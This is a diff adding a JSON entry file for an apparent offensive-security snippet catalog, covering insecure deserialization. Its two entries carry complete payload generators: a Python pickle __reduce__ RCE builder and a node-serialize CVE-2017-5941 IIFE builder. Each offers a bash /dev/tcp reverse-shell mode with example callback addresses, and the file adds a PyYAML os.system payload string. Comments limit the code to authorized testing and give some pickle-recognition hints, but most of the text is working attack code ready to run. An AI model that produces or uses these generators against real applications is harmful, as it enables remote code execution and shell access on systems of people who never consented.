@@ -1,0 +1,44 @@
+{
+  "category": "Insecure Deserialization",
+  "group": "exploit",
+  "catOrder": 16,
+  "entries": [
+    {
+      "title": "Python pickle RCE generator (__reduce__, cmd/revshell) + PyYAML",
+      "lang": "python",
+      "tags": [
+        "deserialization",
+        "pickle",
+        "python",
+        "rce",
+        "yaml"
+      ],
+      "rating": "must",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{CMD}} · {{LHOST}} · {{LPORT}}",
+      "badges": [],
+      "source": "https://docs.python.org/3/library/pickle.html",
+      "license": "GPL-3.0 (original)",
+      "body": "Generates a malicious Python pickle: when the object is deserialized (`pickle.loads`), `__reduce__` fires and returns `(os.system, (cmd,))` - i.e. an arbitrary command is executed. It supports two modes: a single command and a reverse shell. Use it when an application deserializes an untrusted pickle (cookie, cache, task queue, base64 API parameter). It also bundles a card about PyYAML: `yaml.load` without `SafeLoader` runs code just as dangerously.\n\n> pickle is insecure by design - any `pickle.loads` from an untrusted source = RCE. If you see a base64 blob starting with `gASV` / `gAJ` / `KGRw` or the magic `\\x80\\x04`/`\\x80\\x02`, it is almost certainly a pickle.\n\n```python\n#!/usr/bin/env python3\n# pickle_rce_gen.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Generate a malicious pickle whose deserialization runs a command / reverse shell.\nimport argparse, base64, os, pickle\n\nclass Exploit:\n    # __reduce__ controls how the object is reconstructed on unpickling:\n    # the returned callable+args are executed by pickle.loads().\n    def __init__(self, cmd):\n        self.cmd = cmd\n    def __reduce__(self):\n        return (os.system, (self.cmd,))\n\ndef build(cmd):\n    return pickle.dumps(Exploit(cmd))\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL pickle RCE payload generator\")\n    ap.add_argument(\"-c\", \"--cmd\", help=\"command to run on the target\")\n    ap.add_argument(\"--revshell\", nargs=2, metavar=(\"LHOST\", \"LPORT\"),\n                    help=\"build a bash reverse shell instead of --cmd\")\n    ap.add_argument(\"-o\", \"--out\", help=\"write raw pickle bytes to this file\")\n    ap.add_argument(\"--b64\", action=\"store_true\", help=\"also print base64 (for cookies/JSON)\")\n    a = ap.parse_args()\n    if a.revshell:\n        lhost, lport = a.revshell\n        cmd = f\"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"\n    elif a.cmd:\n        cmd = a.cmd\n    else:\n        ap.error(\"give -c/--cmd or --revshell LHOST LPORT\")\n    raw = build(cmd)\n    if a.out:\n        with open(a.out, \"wb\") as f:\n            f.write(raw)\n        print(f\"[+] wrote {len(raw)} bytes -> {a.out}\")\n    if a.b64 or not a.out:\n        print(base64.b64encode(raw).decode())\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\n# single command, base64 output (for cookie/JSON):\npython3 pickle_rce_gen.py -c \"id\" --b64\n# reverse shell, raw bytes to a file:\npython3 pickle_rce_gen.py --revshell 10.10.14.7 4444 -o payload.pkl\n```\n\nPyYAML (the same danger):\n```python\n# yaml.load WITHOUT SafeLoader runs arbitrary code. PoC payload:\n#   !!python/object/apply:os.system [\"id\"]\n# send this string where the server does yaml.load(data) (not safe_load).\n```"
+    },
+    {
+      "title": "node-serialize RCE generator (CVE-2017-5941)",
+      "lang": "python",
+      "tags": [
+        "deserialization",
+        "nodejs",
+        "rce",
+        "cve-2017-5941"
+      ],
+      "rating": "nice",
+      "deps": "stdlib only (Python 3.6+)",
+      "placeholders": "{{CMD}} · {{LHOST}} · {{LPORT}}",
+      "badges": [
+        "legacy"
+      ],
+      "source": "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
+      "license": "GPL-3.0 (original)",
+      "body": "A payload generator for a vulnerability in the npm package `node-serialize` (CVE-2017-5941): its `unserialize()` executes the function body if the value is written as an IIFE (`\"$$ND_FUNC$$function(){...}()\"`). The script assembles such an object with a command or a reverse shell. Use it in niche cases where a Node server deserializes user input specifically via `node-serialize` (or the similar `funcster`). In practice it mostly appears in CTFs and old applications.\n\n> Badge legacy / niche: specifically the outdated `node-serialize` is vulnerable. In modern Node applications it is almost never seen - not a flagship vector, kept for CTF/legacy.\n\n```python\n#!/usr/bin/env python3\n# node_serialize_gen.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Build a node-serialize (CVE-2017-5941) RCE payload (IIFE immediate-invoke trick).\nimport argparse, json\n\ndef build(cmd):\n    # node-serialize unserialize() runs the function body; the trailing () makes it\n    # self-invoke immediately on deserialization ($$ND_FUNC$$ marks a serialized fn).\n    fn = (\"function(){require('child_process').exec('\" + cmd.replace(\"'\", \"\\\\'\") +\n          \"', function(e,o,s){console.log(o);});}()\")\n    obj = {\"rce\": \"$$ND_FUNC$$\" + fn}\n    return json.dumps(obj)\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL node-serialize RCE payload (CVE-2017-5941)\")\n    ap.add_argument(\"-c\", \"--cmd\", help=\"command to run\")\n    ap.add_argument(\"--revshell\", nargs=2, metavar=(\"LHOST\", \"LPORT\"))\n    a = ap.parse_args()\n    if a.revshell:\n        l, p = a.revshell\n        cmd = f\"bash -c 'bash -i >& /dev/tcp/{l}/{p} 0>&1'\"\n    elif a.cmd:\n        cmd = a.cmd\n    else:\n        ap.error(\"give -c/--cmd or --revshell LHOST LPORT\")\n    print(build(cmd))\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 node_serialize_gen.py -c \"id\"\npython3 node_serialize_gen.py --revshell 10.10.14.7 4444\n# send the resulting JSON where the server does serialize.unserialize(input)\n```"
+    }
+  ]
+}
